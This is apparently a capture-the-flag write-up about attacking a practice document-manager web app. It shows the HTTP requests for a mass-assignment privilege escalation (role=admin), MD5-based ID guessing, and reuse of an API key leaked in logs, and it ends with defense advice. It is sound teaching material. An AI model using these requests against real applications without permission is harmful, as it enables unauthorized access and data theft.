Initial Reconnaissance

1

Explore the Application

I started by accessing the challenge URL: http://ctf.example.com:8080

The application presented a clean login page with two main features:

  • User login form
  • "Register new account" link
  • Generic corporate branding for "SecureVault Document Manager"

I created a test account (testuser / Password123!) and logged in to explore the authenticated interface.

Mapping Application Functionality

After logging in, I identified several key endpoints:

GET  /dashboard              - User dashboard
GET  /documents              - Document listing
POST /documents/upload       - Upload new document
GET  /documents/view?id=123  - View specific document
GET  /profile                - User profile page
POST /profile/update         - Update user information

I uploaded a test document and observed the URL structure when viewing it:

http://ctf.example.com:8080/documents/view?id=c4ca4238a0b923820dcc509a6f75849b

The ID appeared to be an MD5 hash. This was my first clue.

üí° Reconnaissance Tip

Always create a test account to explore authenticated functionality. Map all endpoints, parameters, and behaviors systematically before attempting exploitation.

Vulnerability Discovery

2

Identify Weaknesses

Systematic testing revealed multiple potential attack vectors.

Testing for IDOR (Insecure Direct Object Reference)

I experimented with the document ID parameter. My uploaded document had ID c4ca4238a0b923820dcc509a6f75849b.

I tried sequential IDs by computing MD5 hashes of numbers:

$ echo -n "1" | md5sum
c4ca4238a0b923820dcc509a6f75849b  # My document

$ echo -n "2" | md5sum
c81e728d9d4c2f636f067f89cc14862c

$ echo -n "3" | md5sum
eccbc87e4b5ce2fe28308fd9f2a7baf3

Testing these IDs:

http://ctf.example.com:8080/documents/view?id=c81e728d9d4c2f636f067f89cc14862c

Result: Access denied. The application checked ownership‚Äîgood security practice for normal documents.

Examining User Roles

In my profile page, I noticed a hidden field in the HTML source:

The role field was suspicious. Could I modify this?

Hidden form fields often contain sensitive data that developers assume can't be modified. This is a common security mistake.

Bypassing Authentication

3

Exploit Mass Assignment

Attempting to escalate privileges through profile update.

Testing Role Modification

I used Burp Suite to intercept the profile update request and modified the role parameter:

POST /profile/update HTTP/1.1
Host: ctf.example.com:8080
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/x-www-form-urlencoded

username=testuser&email=test@example.com&role=admin

Response:

HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "message": "Profile updated successfully",
  "user": {
    "username": "testuser",
    "email": "test@example.com",
    "role": "admin"
  }
}

Success! The application accepted my role modification without validation. This is a classic mass assignment vulnerability.

üîì Vulnerability Identified

Mass Assignment: The application blindly accepted all submitted form fields without validating which fields users should be allowed to modify. The role field should have been excluded from user updates.

Verifying Privilege Escalation

After refreshing the dashboard, I noticed new menu options:

  • Admin Panel
  • User Management
  • System Documents

The privilege escalation was successful. I now had admin-level access.

Exploring Admin Functionality

4

Navigate Admin Features

Discovering sensitive admin-only resources.

Accessing the Admin Panel

The admin panel revealed several interesting features:

GET /admin/users
- Lists all registered users

GET /admin/documents  
- Shows all documents in the system

GET /admin/logs
- System activity logs

Visiting /admin/documents, I saw a list of all documents including:

| ID  | Title                | Owner          | Uploaded      |
|-----|---------------------|----------------|---------------|
| 1   | test.txt            | testuser       | 2026-01-10    |
| 2   | Meeting Notes       | john_admin     | 2026-01-08    |
| 3   | Budget Report       | sarah_finance  | 2026-01-07    |
| 42  | flag.txt           | root_admin     | 2026-01-01    |

Document ID 42 immediately caught my attention. The flag was likely in that document.

Attempting Direct Access

I calculated the MD5 hash of "42":

$ echo -n "42" | md5sum
a1d0c6e83f027327d8461063f4ac58a6

Then attempted to access the document:

http://ctf.example.com:8080/documents/view?id=a1d0c6e83f027327d8461063f4ac58a6

Response:

HTTP/1.1 403 Forbidden
Content-Type: application/json

{
  "error": "Access denied. This document requires root privileges."
}

Even with admin role, I couldn't access the root-owned document. There had to be another way.

Capturing the Flag

5

Final Exploitation

Discovering the path to root-level access.

Examining Admin Logs

I checked the /admin/logs endpoint and found interesting entries:

[2026-01-10 10:23:45] User 'testuser' role changed to 'admin'
[2026-01-09 14:32:11] API key regenerated for user 'root_admin'
[2026-01-09 14:32:11] New API key: sk_live_a84f3c2e9d1b7f6a...

The logs exposed an API key! This was clearly a severe information disclosure vulnerability.

Using the API Key

I explored the API documentation (accessible at /api/docs) and found:

GET /api/documents/{id}
Authorization: Bearer {api_key}

Returns document content regardless of ownership when valid API key is provided.

Perfect! I crafted the request:

GET /api/documents/42 HTTP/1.1
Host: ctf.example.com:8080
Authorization: Bearer sk_live_a84f3c2e9d1b7f6a...

HTTP/1.1 200 OK
Content-Type: text/plain

Congratulations! Here's your flag:

Key Takeaways & Lessons Learned

This challenge demonstrated a realistic attack chain exploiting multiple vulnerabilities:

Vulnerabilities Exploited

  1. Mass Assignment (CWE-915): The application allowed users to modify their role through the profile update endpoint without proper validation.
  2. Broken Access Control (OWASP A01:2021): Admin panel was accessible to any user with admin role, regardless of how they obtained it.
  3. Information Disclosure (CWE-200): System logs exposed sensitive API keys that should never be logged or displayed.
  4. Insecure Direct Object Reference (IDOR): While mitigated for regular documents, the API endpoint bypassed ownership checks with valid credentials.

Defense Recommendations

üõ°Ô∏è How to Prevent These Vulnerabilities

Mass Assignment: Implement allowlists for user-modifiable fields. Never trust client input for sensitive fields like roles, permissions, or internal IDs.

Access Control: Implement proper role-based access control with server-side validation. Check both authentication (who you are) and authorization (what you can access).

Sensitive Data in Logs: Never log credentials, API keys, tokens, or other secrets. Implement proper secret management and rotation.

API Security: Apply the same authorization checks to API endpoints as you do to web interfaces. APIs are not "trusted" channels.

CTF Strategy Insights

This challenge taught me several valuable lessons about CTF problem-solving:

  • Be Systematic: Map all functionality before attempting exploitation. Understanding the full application helps identify attack chains.
  • Read the Source: View page source, check JavaScript files, and examine HTML comments. Developers often leave hints.
  • Test Everything: Don't assume security controls work as intended. Test authentication, authorization, input validation, and access controls.
  • Chain Vulnerabilities: Real-world and CTF scenarios often require combining multiple smaller vulnerabilities for full exploitation.
  • Document Your Process: Taking notes helps when you need to backtrack or when similar patterns appear in other challenges.
